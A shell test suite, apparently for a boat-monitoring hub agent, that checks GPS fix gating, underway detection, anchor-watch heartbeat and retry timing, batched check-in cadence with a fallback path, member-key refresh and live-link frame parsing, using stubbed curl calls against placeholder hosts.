check "gate: fewer than 4 satellites is unreliable" "1" "$(gps_unreliable 1 3 0.9 0 30)"
check "gate: a fix older than 3 samples is unreliable" "1" "$(gps_unreliable 1 9 0.9 91 30)"
check "gate: unknown sats/hdop never count against the fix" "0" "$(gps_unreliable 1 - - 0 30)"
check "gate: no fix is unreliable" "1" "$(gps_unreliable 0 - - 0 30)"

# --- underway detection ---
(
  hl17
  UW=0; UW_ENTER_N=0
  underway_step 1000 41.0 -81.0 2.0 0 0 0; echo "one=$UW" > "$C17/u"
  underway_step 1030 41.0 -81.0 2.1 0 0 0; echo "two=$UW" >> "$C17/u"
  UW=0; UW_ENTER_N=0
  underway_step 1000 41.0 -81.0 2.0 0 0 0; underway_step 1030 41.0 -81.0 2.0 0 1 0; underway_step 1060 41.0 -81.0 0.1 0 0 0
  echo "gapped=$UW" >> "$C17/u"
  UW=0; UW_ENTER_N=0
  underway_step 1000 41.0 -81.0 - 60 0 0; underway_step 1030 41.0 -81.0 - 70 0 0; echo "displace=$UW" >> "$C17/u"
  UW=0; UW_ENTER_N=0
  underway_step 1000 41.0 -81.0 0.2 60 0 1; underway_step 1030 41.0 -81.0 0.2 70 0 1; echo "armedswing=$UW" >> "$C17/u"
  UW=1; UW_SLOW_SINCE=""
  underway_step 2000 41.0 -81.0 0.2 0 0 0; underway_step 2200 41.0 -81.0 0.1 0 0 0; echo "slow200=$UW" >> "$C17/u"
  underway_step 2250 41.0 -81.0 0.1 0 1 0; echo "unreliable-at-310=$UW" >> "$C17/u"
  underway_step 2301 41.0 -81.0 0.1 0 0 0; echo "slow301=$UW" >> "$C17/u"
  UW=1; UW_SLOW_SINCE=""
  underway_step 3000 41.0 -81.0 0.2 0 0 0; underway_step 3200 41.001 -81.0 0.2 0 0 0; underway_step 3350 41.001 -81.0 0.2 0 0 0
  echo "drifting=$UW" >> "$C17/u"
)
check "underway: one fast fix is not a trip" "one=0" "$(sed -n 1p "$C17/u")"
check "underway: SOG >= 1.5 kn on 2 consecutive fixes enters" "two=1" "$(sed -n 2p "$C17/u")"
check "underway: an unreliable fix between them never starts a trip (and a slow one resets)" "gapped=0" "$(sed -n 3p "$C17/u")"
check "underway: >= 50 m from the last sent position on 2 fixes enters (no SOG source)" "displace=1" "$(sed -n 4p "$C17/u")"
check "underway: while ARMED a swing away from the last sent position is not a trip" "armedswing=0" "$(sed -n 5p "$C17/u")"
check "underway: slow for 200 s is still underway" "slow200=1" "$(sed -n 6p "$C17/u")"
check "underway: an unreliable fix never ends a trip" "unreliable-at-310=1" "$(sed -n 7p "$C17/u")"
check "underway: 5 min under 0.5 kn and 25 m ends it" "slow301=0" "$(sed -n 8p "$C17/u")"
check "underway: slow but moving 100+ m restarts the 5-min clock" "drifting=1" "$(sed -n 9p "$C17/u")"

# --- gps_tick end to end: armed heartbeat, no positions inside, breach positions, underway ---
(
  hl17
  : > "$C17/urls"; printf '{"status":"ok"}' > "$C17/reply"
  curl() { agent_curl "$@"; }
  SAMPLE="41.4086 -81.7494 5 9 0.9 0.0"
  collect_gps() { echo "$SAMPLE"; }
  apply_anchor 1234 41.4086 -81.7494 50 0
  GPS_LAST_LAT=""; gps_tick
  echo "armed-inside-positions=$(grep -c 'event=gps.measurement' "$C17/urls")" > "$C17/g"
  echo "sample-secs=$(gps_sample_secs "$(date +%s)")" >> "$C17/g"
  gps_heartbeat "$(date +%s)"
  grep 'event=gps.heartbeat' "$C17/urls" | sed 's/.*&t=tok_SECRET_0123456789&//; s/fixAgeS=[0-9]*/fixAgeS=N/' >> "$C17/g"
  SAMPLE="41.4095 -81.7494 5 9 0.9 0.0"; gps_tick
  echo "breach-positions=$(grep -c 'event=gps.measurement' "$C17/urls")" >> "$C17/g"
  echo "lan=$(tr -d '\n' < "$HUB_LITE_GPS" | sed 's/"ts":[0-9]*,//; s/"fixAt":[0-9]*,//')" >> "$C17/g"
  apply_anchor 0; : > "$C17/urls"
  SAMPLE="41.4095 -81.7494 5 9 0.9 0.0"; gps_tick
  echo "disarm-final=$(grep -c 'event=gps.measurement' "$C17/urls")" >> "$C17/g"
  gps_tick
  echo "unarmed-unmoved=$(grep -c 'event=gps.measurement' "$C17/urls")" >> "$C17/g"
  SAMPLE="41.4095 -81.7494 5 9 0.9 2.5"; gps_tick; gps_tick; gps_tick
  echo "underway-within-5min: underway=$UW positions=$(grep -c 'event=gps.measurement' "$C17/urls") secs=$(gps_sample_secs "$(date +%s)")" >> "$C17/g.uw"
  GPS_LAST_SENT=$(( $(date +%s) - 301 )); gps_tick; gps_tick
  echo "underway=$UW positions=$(grep -c 'event=gps.measurement' "$C17/urls") secs=$(gps_sample_secs "$(date +%s)")" >> "$C17/g"
  DEVICE_TOKEN=""; : > "$C17/urls"; apply_anchor 55 41.4086 -81.7494 50 0; gps_heartbeat "$(date +%s)"
  echo "legacy-heartbeats=$(wc -l < "$C17/urls" | tr -d ' ')" >> "$C17/g"
  # Owner ruling 2026-09-15: a security zone on its own gets NO 60 s heartbeat — the check-in only.
  DEVICE_TOKEN="tok_SECRET_0123456789"; apply_anchor 0; : > "$C17/urls"; GPS_FORCE_NEXT=0; UW=0; UW_ENTER_N=0
  apply_watch "" "77 41.4086 -81.7494 40 3"
  SAMPLE="41.4086 -81.7494 5 9 0.9 0.0"; gps_tick; gps_heartbeat "$(date +%s)"
  echo "zone-only: due=$(hb_armed && echo yes || echo no) heartbeats=$(grep -c 'event=gps.heartbeat' "$C17/urls") positions=$(grep -c 'event=gps.measurement' "$C17/urls") sig=$(anchor_sig)" >> "$C17/g"
  SAMPLE="41.4095 -81.7494 5 9 0.9 0.0"; gps_tick; gps_tick; gps_tick
  echo "zone-breach: event=$(grep -c 'event=zone.motion' "$C17/urls") anchorwatch-tag=$(grep -c 'anchorwatch=1' "$C17/urls")" >> "$C17/g"
)
check "tick: armed and inside the circle sends no position" "armed-inside-positions=0" "$(sed -n 1p "$C17/g")"
check "tick: armed samples at 30 s" "sample-secs=30" "$(sed -n 2p "$C17/g")"
check "heartbeat: the quality fields, no position, the watch signature" \
  "fixValid=1&sats=9&hdop=0.9&fixAgeS=N&inside=1&distFromCenterM=0&streak=0&unreliable=0&anchorsig=1234" "$(sed -n 3p "$C17/g")"
check "tick: a sample outside the circle IS sent (breach positions)" "breach-positions=1" "$(sed -n 4p "$C17/g")"
check "lan read: the collector's JSON for cgi-bin/gps" \
  'lan={"v":1,"state":"armed","leased":false,"anchorsig":"1234","fixValid":true,"unreliable":false,"fixAgeS":0,"lat":41.4095,"lon":-81.7494,"acc":5,"sats":9,"hdop":0.9,"sogKn":0.0,"inside":false,"distFromCenterM":100}' \
  "$(sed -n 5p "$C17/g")"
check "tick: the disarm sends one final position" "disarm-final=1" "$(sed -n 6p "$C17/g")"
check "tick: unarmed and unmoved sends nothing" "unarmed-unmoved=1" "$(sed -n 7p "$C17/g")"
check "tick: underway after 2 fast fixes samples at 30 s but sends nothing inside 5 min of the last position" "underway-within-5min: underway=1 positions=1 secs=30" "$(cat "$C17/g.uw")"
check "tick: underway sends one position once 5 min have passed, then waits again" "underway=1 positions=2 secs=30" "$(sed -n 8p "$C17/g")"
check "heartbeat: never on the legacy /api/shelly path (it would be an alert a minute)" "legacy-heartbeats=0" "$(sed -n 9p "$C17/g")"
check "heartbeat: a SECURITY ZONE alone gets none, and sends no position inside (owner ruling 2026-09-15)" "zone-only: due=no heartbeats=0 positions=0 sig=77" "$(sed -n 10p "$C17/g")"
check "zone: the breach is still detected locally and sent at once; zone fixes are not tagged as an anchor watch" "zone-breach: event=1 anchorwatch-tag=0" "$(sed -n 11p "$C17/g")"

# --- the anchor heartbeat clock: 5 min inside, retry within 60 s, breach immediate (owner 2026-09-15) ---
(
  hl17
  apply_anchor 4321 41.4086 -81.7494 50 0
  echo "vars=$GPS_HEARTBEAT_INSIDE_SEC/$GPS_HEARTBEAT_SEC/$GPS_HEARTBEAT_RETRY_SEC/$GPS_HEARTBEAT_RETRY_MAX_SEC" > "$C17/hb"
  echo "new-watch-due-now=$([ "$(hb_due_at 5000)" = 5000 ] && echo yes || echo no)" >> "$C17/hb"
  HB_OK=1
  gps_heartbeat() { echo "$1" >> "$C17/hb.sent"; [ "$HB_OK" = 1 ] || return 1; LAST_REPORT_OK_AT=$1; HB_SENT_SIG=$(anchor_sig); }
  rm -f "$C17/hb.sent"; ANCHOR_OUT=0
  _t=100000; while [ "$_t" -lt 103600 ]; do hb_tick "$_t"; _t=$(( _t + 30 )); done
  echo "armed-hour-inside=$(wc -l < "$C17/hb.sent" | tr -d ' ')" >> "$C17/hb"
  echo "inside-due=$(( $(hb_due_at 200000) - LAST_REPORT_OK_AT ))" >> "$C17/hb"
  ANCHOR_OUT=1; echo "outside-due=$(( $(hb_due_at 200000) - LAST_REPORT_OK_AT ))" >> "$C17/hb"; ANCHOR_OUT=0
  LAST_REPORT_OK_AT=110000; echo "any-report-resets=$(hb_due_at 110010)" >> "$C17/hb"
  # A failure at the due time: retried 30 s later, then at most 60 s apart, until one succeeds.
  rm -f "$C17/hb.sent"; LAST_REPORT_OK_AT=120000; HB_OK=0
  _t=120300; while [ "$_t" -le 120420 ]; do [ "$_t" -ge 120390 ] && HB_OK=1; hb_tick "$_t"; _t=$(( _t + 5 )); done
  echo "retries=$(tr '\n' ' ' < "$C17/hb.sent")fails=$HB_FAILS next=$(( $(hb_due_at 120400) - 120390 ))" >> "$C17/hb"
  echo "backoff=$(hb_retry_secs 1) $(hb_retry_secs 2) $(hb_retry_secs 5)" >> "$C17/hb"
)
check "heartbeat clock: named 300 s inside, 60 s outside, retry 30 s capped at 60 s" "vars=300/60/30/60" "$(sed -n 1p "$C17/hb")"
check "heartbeat clock: a newly adopted watch heartbeats at once" "new-watch-due-now=yes" "$(sed -n 2p "$C17/hb")"
check "heartbeat clock: about 12 heartbeats in an armed hour inside the radius (was 60)" "armed-hour-inside=12" "$(sed -n 3p "$C17/hb")"
check "heartbeat clock: inside, due 300 s after the last successful report" "inside-due=300" "$(sed -n 4p "$C17/hb")"
check "heartbeat clock: outside, back to 60 s" "outside-due=60" "$(sed -n 5p "$C17/hb")"
check "heartbeat clock: any successful report resets it" "any-report-resets=110300" "$(sed -n 6p "$C17/hb")"
check "heartbeat clock: a failure is retried after 30 s, then 60 s, and stops once one succeeds" "retries=120300 120330 120390 fails=0 next=300" "$(sed -n 7p "$C17/hb")"
check "heartbeat clock: retry backoff 30, 60, never above 60" "backoff=30 60 60" "$(sed -n 8p "$C17/hb")"
(
  hl17
  : > "$C17/urls"; printf '{"status":"ok"}' > "$C17/reply"
  curl() { agent_curl "$@"; }
  collect_gps() { echo "$SAMPLE"; }
  apply_anchor 999 41.4086 -81.7494 50 0
  SAMPLE="41.4086 -81.7494 5 9 0.9 0.0"; GPS_LAST_LAT=""; gps_tick; gps_tick
  _before=$(wc -l < "$C17/urls" | tr -d ' ')
  SAMPLE="41.4095 -81.7494 5 9 0.9 0.0"; gps_tick; gps_tick; HB_SENT_SIG=999
  echo "breach: motion=$(grep -c 'event=anchor.motion' "$C17/urls") positions=$(grep -c 'event=gps.measurement' "$C17/urls") heartbeat-due=$(( $(hb_due_at "$(date +%s)") - LAST_REPORT_OK_AT ))" > "$C17/hbb"
  # Curl fails (-f exit 22) on a real send: send_event reports failure and the retry is scheduled.
  curl() { return 22; }
  # ONE clock read for the whole step: hb_tick sets HB_RETRY_AT to (its argument + 30), so reading
  # the clock again for the arithmetic below prints 29 whenever the second read lands in the next
  # second. Both the argument and the subtrahend must be the same instant.
  _hbnow=$(date +%s)
  HB_SENT_SIG=999; LAST_REPORT_OK_AT=$(( _hbnow - 400 )); ANCHOR_OUT=0; hb_tick "$_hbnow"
  echo "fail: fails=$HB_FAILS retry-in=$(( HB_RETRY_AT - _hbnow ))" >> "$C17/hbb"
)
check "breach: the drag alarm on the 2nd outside sample and a position on each, with no wait for any clock" "breach: motion=1 positions=2 heartbeat-due=60" "$(sed -n 1p "$C17/hbb")"
check "retry: a real failed heartbeat send (curl error) schedules the retry within 60 s" "fail: fails=1 retry-in=30" "$(sed -n 2p "$C17/hbb")"

# --- the check-in (L1): the cadence switch, and what rides it ---
LEASE_REPLY='{"status":"ok","event":"hub.checkin","lease":1,"leaseUntil":4102444800,"checkinSec":60,"live":1}'
NOLEASE_REPLY='{"status":"ok","event":"hub.checkin","lease":0,"leaseUntil":0,"checkinSec":900,"live":0}'
check "live fields: a leased reply" "1 4102444800 60 1" "$(printf '%s' "$LEASE_REPLY" | parse_live_fields)"
check "live fields: nobody watching" "0 0 900 0" "$(printf '%s' "$NOLEASE_REPLY" | parse_live_fields)"
check "live fields: a reply without them (switch off) says nothing" "" "$(printf '{"status":"ok","leases":1}' | parse_live_fields)"
check "cadence: 60 min unwatched" "3600" "$(checkin_interval 0 0 1000 1)"
check "cadence: 1 min while a lease is live" "60" "$(checkin_interval 1 2000 1000 1)"
check "cadence: a lease that has run out is unwatched" "3600" "$(checkin_interval 1 999 1000 1)"
check "cadence: a failed check-in retries within 2 min" "120" "$(checkin_interval 0 0 1000 0)"

# 0.18.10 (owner 2026-09-26): an ARMED watch shortens the hour, because then the check-in is what
# carries the boat's position. Shortest wins, and a lease still beats both.
check "cadence: an armed anchor watch is 5 min" "300" "$(checkin_interval 0 0 1000 1 anchor)"
check "cadence: an armed security zone is 15 min" "900" "$(checkin_interval 0 0 1000 1 zone)"
check "cadence: a live lease beats an armed anchor watch" "60" "$(checkin_interval 1 2000 1000 1 anchor)"
check "cadence: a failed check-in still retries within 2 min while armed" "120" "$(checkin_interval 0 0 1000 0 anchor)"
# An unknown arm must fall back to idle, never to 0 — a 0 would busy-loop the check-in.
check "cadence: an unrecognised arm falls back to the idle hour" "3600" "$(checkin_interval 0 0 1000 1 nonsense)"

# watch_armed picks the tighter watch when both are on.
_wa=$(mktemp -d)
ANCHOR_STATE="$_wa/a" ZONE_STATE="$_wa/z"
check "watch_armed: nothing armed" "" "$(watch_armed)"
printf 'z' > "$_wa/z"; check "watch_armed: zone only" "zone" "$(watch_armed)"
printf 'a' > "$_wa/a"; check "watch_armed: anchor wins over zone" "anchor" "$(watch_armed)"
rm -f "$_wa/z"; check "watch_armed: anchor only" "anchor" "$(watch_armed)"
rm -rf "$_wa"; unset ANCHOR_STATE ZONE_STATE

# 🔴 THE COUPLING THAT WOULD HAVE SHIPPED SILENTLY. Both rate limits were written as
# `CHECKIN_IDLE_SEC - 30` only because that happened to be 15 minutes. Tying them to the check-in
# would have let a REVOKED crew key keep working for an hour, and made the app draw hour-old valve
# state. They read IDLE_REPORT_SEC now, and it must stay 15 min while the check-in is an hour.
check "cadence: the idle check-in is an hour" "3600" "$CHECKIN_IDLE_SEC"
check "cadence: the report period stayed 15 min and did NOT follow the check-in" "900" "$IDLE_REPORT_SEC"
check "cadence: the member-key refresh is rate-limited by the report period, not the check-in" "1" \
  "$(grep -c 'KEYS_ASKED_AT )) -ge $(( IDLE_REPORT_SEC - 30 ))' "$HL_DIR/brvg-hub-lite.sh")"
check "cadence: the idle valve report is rate-limited by the report period, not the check-in" "1" \
  "$(grep -c '_lci_last )) -lt $(( IDLE_REPORT_SEC - 30 ))' "$HL_DIR/brvg-hub-lite.sh")"

# --- 0.18.0: the check-in IS the batch (one POST /api/agent/batch per tick, not two GETs) --------
# A curl stand-in that can answer BOTH shapes, so one stub covers the batch path and the fallback:
#   POST (drain_relay: -o <file> -w %{http_code} -d <body> <url>) → logs "POST <url>", records the
#     body, writes $C17/reply into the -o file and prints $BATCH_CODE (default 200) as the status;
#   GET  (send_event: -fsS <url>)                                  → logs "GET <url>", prints the reply.
batch_curl() {
  _bc_o=""; _bc_body=""; _bc_p=""
  for _a in "$@"; do
    [ "$_bc_p" = "-o" ] && _bc_o="$_a"
    [ "$_bc_p" = "-d" ] && _bc_body="$_a"
    _bc_p="$_a"
  done
  _bc_url=$(eval "echo \"\${$#}\"")
  if [ -n "$_bc_body" ]; then
    echo "POST $_bc_url" >> "$C17/urls"
    printf '%s\n' "$_bc_body" >> "$C17/bodies"
    [ -n "$_bc_o" ] && cat "$C17/reply" > "$_bc_o" 2>/dev/null
    printf '%s' "${BATCH_CODE:-200}"
    return 0
  fi
  echo "GET $_bc_url" >> "$C17/urls"
  cat "$C17/reply" 2>/dev/null
}
# The batch replies the worker now sends (DockNeighbor-Cloud agentBatchRoute.ts): the summary, plus
# the SAME four flat lease fields, `keysSig`, `anchor` and `linktap` the /api/agent reply carried.
B_KEYSIG=$(printf 'c%.0s' $(seq 1 64))
B_KEYSIG2=$(printf 'd%.0s' $(seq 1 64))
B_NOLEASE='{"status":"ok","processed":1,"failed":0,"touched":0,"skipped":0,"lease":0,"leaseUntil":0,"checkinSec":900,"live":0,"keysSig":"'"$B_KEYSIG"'"}'
B_ROTATED='{"status":"ok","processed":1,"failed":0,"touched":0,"skipped":0,"lease":0,"leaseUntil":0,"checkinSec":900,"live":0,"keysSig":"'"$B_KEYSIG2"'"}'
B_LEASE='{"status":"ok","processed":1,"failed":0,"touched":0,"skipped":0,"lease":1,"leaseUntil":4102444800,"checkinSec":60,"live":1,"keysSig":"'"$B_KEYSIG"'","anchor":{"sig":1757750400000,"lat":41.492907,"lon":-81.694361,"radiusM":60,"warnM":45,"hbSec":300,"sampleSec":30}}'
(
  hl17
  : > "$C17/urls"; : > "$C17/bodies"; : > "$C17/ci.log"
  curl() { batch_curl "$@"; }
  live_link_manage() { echo "manage lease=$LIVE_LEASE live=$LIVE_OK" >> "$C17/ci.log"; }
  fetch_member_keys() { echo keys >> "$C17/ci.log"; }
  fetch_mgmt_key() { :; }
  # Not a param of MODEM_P: collect_wan_usage appends its own `wanSrc` on a real router, and the wire
  # contract has no duplicate keys.
  MODEM_P="up=1&rssi=-70&sinr=12&dataMb=1234"; MODEM_PENDING=1
  printf '%s' "$B_NOLEASE" > "$C17/reply"
  do_checkin 10000
  echo "idle=$(checkin_interval "$LIVE_LEASE" "$LIVE_UNTIL" 10000 "$CHECKIN_OK") reqs=$(wc -l < "$C17/urls" | tr -d ' ')" > "$C17/ci"
  printf '%s' "$B_LEASE" > "$C17/reply"
  MODEM_PENDING=1
  do_checkin 10060
  echo "leased=$(checkin_interval "$LIVE_LEASE" "$LIVE_UNTIL" 10060 "$CHECKIN_OK") anchor=$(anchor_sig)" >> "$C17/ci"
  printf '{"status":"ok","processed":1}' > "$C17/reply"
  do_checkin 10120
  echo "switch-off=$(checkin_interval "$LIVE_LEASE" "$LIVE_UNTIL" 10120 "$CHECKIN_OK")" >> "$C17/ci"
  cp "$C17/urls" "$C17/urls.ci"; cp "$C17/bodies" "$C17/bodies.ci"
  DEVICE_TOKEN=""; : > "$C17/urls"; do_checkin 10180
  echo "legacy=$(grep -c 'hub.checkin' "$C17/urls") reqs=$(wc -l < "$C17/urls" | tr -d ' ')" >> "$C17/ci"
)
check "check-in: 3600 s after a batch reply with no lease, and it cost ONE request (0.17.0 spent two)" "idle=3600 reqs=1" "$(sed -n 1p "$C17/ci")"
check "check-in: the batch reply's lease switches the cadence to 60 s, and its anchor is adopted" "leased=60 anchor=1757750400000" "$(sed -n 2p "$C17/ci")"
check "check-in: back to 3600 s when a batch reply stops carrying the lease" "switch-off=3600" "$(sed -n 3p "$C17/ci")"
check "check-in: never on the legacy VEHICLE_KEY path (/api/shelly would alert every 15 min)" "legacy=0 reqs=0" "$(sed -n 4p "$C17/ci")"
check "check-in: three check-ins, three POSTs to /api/hub-lite/batch and no GET at all" "3 0" \
  "$(grep -c '^POST' "$C17/urls.ci") $(grep -c '^GET' "$C17/urls.ci")"
check "check-in: the watch signature rides the batch URL — agentBatchRoute reads ?anchorsig=, never the item's param" "3" \
  "$(grep -c '^POST https://api.example.test/api/hub-lite/batch?vid=v_test&device=brv_net_test&t=tok_SECRET_0123456789&anchorsig=[0-9]*$' "$C17/urls.ci")"
HLV_RE=$(printf '%s' "$HUB_LITE_VERSION" | sed 's/\./\\./g')
# 0.18.2: both modem-carrying check-ins were composed before any reply said a member was watching,
# so they carry the sample's STATE (up, dataMb) and not its signal (rssi, sinr).
check "check-in: the hub.checkin item carries the modem sample — the cloud stores it as modem.measurement" "2" \
  "$(grep -c '"device":"brv_net_test","event":"hub.checkin","params":{"up":"1","dataMb":"1234","av":"'"$HLV_RE"'"' "$C17/bodies.ci")"
check "check-in: with no sample pending the item is a PLAIN check-in (av alone is not a reading)" "1" \
  "$(grep -c '"event":"hub.checkin","params":{"av":"'"$HLV_RE"'"}' "$C17/bodies.ci")"
check "check-in: the pending modem sample rides ONE check-in only (once per sample, as in 0.17.0)" "2" \
  "$(grep -c '"dataMb":"1234"' "$C17/bodies.ci")"
check "check-in: nobody watching, no signal on the wire (0.18.2)" "0" "$(grep -c '"rssi"\|"sinr"' "$C17/bodies.ci")"
check "check-in: the check-in batch is kind delta — a conditionally-built modem sample is not a keyframe" "3" \
  "$(grep -c '"kind":"delta"' "$C17/bodies.ci")"
check "check-in: every check-in still settles the link" "manage lease=0 live=0|manage lease=1 live=1|manage lease=0 live=0" \
  "$(grep manage "$C17/ci.log" | tr '\n' '|' | sed 's/|$//')"

# The member-key signature is read off the BATCH reply exactly as it was off the /api/agent reply.
(
  hl17
  : > "$C17/urls"; : > "$C17/bodies"; : > "$C17/k2.log"
  curl() { batch_curl "$@"; }
  live_link_manage() { :; }
  fetch_mgmt_key() { :; }
  fetch_member_keys() { echo members >> "$C17/k2.log"; }
  printf 'sig %s\n' "$B_KEYSIG" > "$MEMBER_KEYS_FILE"
  printf '%s' "$B_NOLEASE" > "$C17/reply"          # keysSig == what we hold
  do_checkin 20000
  echo "same=$(grep -c members "$C17/k2.log")" > "$C17/k2"
  printf '%s' "$B_ROTATED" > "$C17/reply"
  do_checkin 20060
  echo "changed=$(grep -c members "$C17/k2.log")" >> "$C17/k2"
)
check "check-in: keysSig on the BATCH reply — the member set is not re-fetched while it matches" "same=0" "$(sed -n 1p "$C17/k2")"
check "check-in: a changed keysSig on the batch reply fetches the set, with no extra poll in between" "changed=1" "$(sed -n 2p "$C17/k2")"

# The idle valves and anything else spooled ride the SAME single POST as the check-in.
(
  hl17
  : > "$C17/urls"; : > "$C17/bodies"
  curl() { batch_curl "$@"; }
  live_link_manage() { :; }; fetch_mgmt_key() { :; }; fetch_member_keys() { :; }
  printf '%s' "$B_NOLEASE" > "$C17/reply"
  printf '1\tshellyht-b2\thumidity.change\trh=60\n' > "$RELAY_SPOOL"
  printf '2\tlt_AAAA\tlinktap.measurement\twatering=0&vol_l=0.00\n' >> "$RELAY_SPOOL"
  MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
  do_checkin 30000
  echo "reqs=$(wc -l < "$C17/urls" | tr -d ' ') items=$(grep -o '"device":"' "$C17/bodies" | wc -l | tr -d ' ')" > "$C17/mix"
)
check "check-in: the check-in, the modem, a valve and a relayed sensor leave in ONE post, as three items" "reqs=1 items=3" "$(sed -n 1p "$C17/mix")"

# FALLBACK (rule 5): a worker that predates the batch endpoint answers 404. The check-in is not
# optional, so the tick finishes on the 0.17.0 single-event path and stays there until the re-probe.
(
  hl17
  : > "$C17/urls"; : > "$C17/bodies"
  curl() { batch_curl "$@"; }
  live_link_manage() { :; }; fetch_mgmt_key() { :; }; fetch_member_keys() { :; }
  printf '%s' "$NOLEASE_REPLY" > "$C17/reply"
  BATCH_CODE=404
  MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
  do_checkin 40000
  echo "first=$(grep -c '^POST' "$C17/urls")post/$(grep -c '^GET' "$C17/urls")get ok=$CHECKIN_OK" > "$C17/fb"
  echo "checkin=$(grep -c 'event=hub.checkin' "$C17/urls") modem=$(grep -c 'event=modem.measurement' "$C17/urls")" >> "$C17/fb"
  : > "$C17/urls"
  MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
  do_checkin 40900
  echo "next=$(grep -c '^POST' "$C17/urls")post/$(grep -c '^GET' "$C17/urls")get" >> "$C17/fb"
  : > "$C17/urls"
  BATCH_CODE=200; printf '%s' "$B_NOLEASE" > "$C17/reply"
  MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
  do_checkin $(( 40000 + BATCH_REPROBE_SEC ))
  echo "reprobe=$(grep -c '^POST' "$C17/urls")post/$(grep -c '^GET' "$C17/urls")get refused=$BATCH_REFUSED_AT" >> "$C17/fb"
)
check "fallback: a 404 from /api/hub-lite/batch still delivers the check-in, down the 0.17.0 path" "first=1post/2get ok=1" "$(sed -n 1p "$C17/fb")"
check "fallback: and that is the check-in GET plus the modem GET, exactly as 0.17.0 sent them" "checkin=1 modem=1" "$(sed -n 2p "$C17/fb")"
check "fallback: the next tick does not re-ask an endpoint the cloud just refused" "next=0post/2get" "$(sed -n 3p "$C17/fb")"
check "fallback: after the re-probe window a working batch endpoint is adopted again" "reprobe=1post/0get refused=0" "$(sed -n 4p "$C17/fb")"
# The WAN deltas are CONSUMED by composing the check-in item (collect_wan_usage advances each
# interface's baseline). If the refused batch is dropped and send_modem recomposes, the interval's
# bytes report as zero and are gone from the plan-burn total for good — so the legacy GET reuses
# exactly what the check-in item carried.
(
  hl17
  : > "$C17/urls"; : > "$C17/bodies"
  curl() { batch_curl "$@"; }
  live_link_manage() { :; }; fetch_mgmt_key() { :; }; fetch_member_keys() { :; }
  printf '%s' "$NOLEASE_REPLY" > "$C17/reply"
  BATCH_CODE=404
  # One compose's worth of usage, handed out once: a second collect_wan_usage would yield nothing.
  collect_wan_usage() { if [ -f "$C17/wan.spent" ]; then printf ''; else : > "$C17/wan.spent"; printf '&wanSrc=cellular&wanKb_cellular=812'; fi; }
  rm -f "$C17/wan.spent"
  MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
  do_checkin 60000
  echo "kb=$(grep -c 'wanKb_cellular=812' "$C17/urls") pending=$MODEM_PENDING" > "$C17/wanfb"
)
check "fallback: the WAN bytes the refused batch consumed still reach the cloud on the legacy GET" "kb=1 pending=0" "$(sed -n 1p "$C17/wanfb")"

# The whole point, counted: a quiet 24 h at the 15-minute idle cadence. Both numbers are MEASURED by
# running the same code twice — once on the batch path, once forced onto the 0.17.0 path.
(
  hl17
  LINKTAP_HOST=""; LINKTAP_GW_ID=""; LINKTAP_DEV_IDS=""     # a box with no valve: the check-in alone
  curl() { batch_curl "$@"; }
  live_link_manage() { :; }; fetch_mgmt_key() { :; }; fetch_member_keys() { :; }
  printf '%s' "$B_NOLEASE" > "$C17/reply"
  : > "$C17/urls"; : > "$C17/bodies"
  _t=0
  while [ "$_t" -lt 96 ]; do
    MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
    do_checkin $(( 50000 + _t * 900 ))
    _t=$(( _t + 1 ))
  done
  echo "after=$(wc -l < "$C17/urls" | tr -d ' ')" > "$C17/day"
  : > "$C17/urls"
  # Forced onto the single-event path: a refusal far in the future is never within the re-probe window.
  BATCH_REFUSED_AT=$(( 50000 + 96 * 900 )); printf '%s' "$NOLEASE_REPLY" > "$C17/reply"
  _t=0
  while [ "$_t" -lt 96 ]; do
    MODEM_P="up=1&rssi=-70"; MODEM_PENDING=1
    do_checkin $(( 50000 + _t * 900 ))
    _t=$(( _t + 1 ))
  done
  echo "before=$(wc -l < "$C17/urls" | tr -d ' ')" >> "$C17/day"
)
check "24 h idle, 0.17.0: 96 check-ins cost 192 requests (a check-in GET and a modem GET each)" "before=192" "$(sed -n 2p "$C17/day")"
check "24 h idle, 0.18.0: the same 96 check-ins cost 96 — one POST each, modem included" "after=96" "$(sed -n 1p "$C17/day")"

# --- L4: keys ride the check-in ---
(
  hl17
  fetch_mgmt_key() { echo mgmt >> "$C17/k.log"; }
  fetch_member_keys() { echo members >> "$C17/k.log"; }
  : > "$C17/k.log"; KEYS_ASKED_AT=0
  LAST_REPLY='{"status":"ok"}'
  keys_on_checkin 100000; keys_on_checkin 100060; keys_on_checkin 100900
  echo "nosig=$(grep -c members "$C17/k.log") mgmt=$(grep -c mgmt "$C17/k.log")" > "$C17/k"
  printf 'sig %s\n' "$(printf 'a%.0s' $(seq 1 64))" > "$MEMBER_KEYS_FILE"
  : > "$C17/k.log"
  LAST_REPLY="{\"status\":\"ok\",\"keysSig\":\"$(printf 'a%.0s' $(seq 1 64))\"}"; keys_on_checkin 200000
  LAST_REPLY="{\"status\":\"ok\",\"keysSig\":\"$(printf 'b%.0s' $(seq 1 64))\"}"; keys_on_checkin 200060
  echo "sig=$(grep -c members "$C17/k.log")" >> "$C17/k"
)
check "keys: without a signature on the reply, the member set is asked on the check-in at most once per 15 min" "nosig=2 mgmt=3" "$(sed -n 1p "$C17/k")"
check "keys: with a signature on the reply, asked only when it changed" "sig=1" "$(sed -n 2p "$C17/k")"

# --- the live link (D6): open/close with the lease, relayed calls through the door's role gate ---
check "poll verdict: 200 is a call" "call" "$(live_poll_verdict 200)"
check "poll verdict: 204 polls again" "again" "$(live_poll_verdict 204)"
check "poll verdict: no answer retries" "retry" "$(live_poll_verdict 000)"
check "poll verdict: 409 not_leased ends the link" "stop" "$(live_poll_verdict 409)"
# (The frame is put in a variable first: bash, which is `sh` on macOS, mis-parses an escaped quote
# inside single quotes inside "$(...)" and brace-expands the result. dash, as CI runs, does not.)
_fr='{"type":"call","id":"c1","uid":"u","role":"control","method":"POST","path":"/api/hub/linktap/valve","body":"{\"devId\":\"a\",\"action\":\"open\"}"}'
check "frame: body unescaped" '{"devId":"a","action":"open"}' "$(printf '%s' "$_fr" | live_frame_str body)"
check "frame: a key inside the body is never read as the frame's" "monitor" \
  "$(printf '%s' '{"type":"call","id":"c1","uid":"u","role":"monitor","method":"POST","path":"/p","body":"{\"role\":\"owner\"}"}' | live_frame_str role)"
_lpa=""
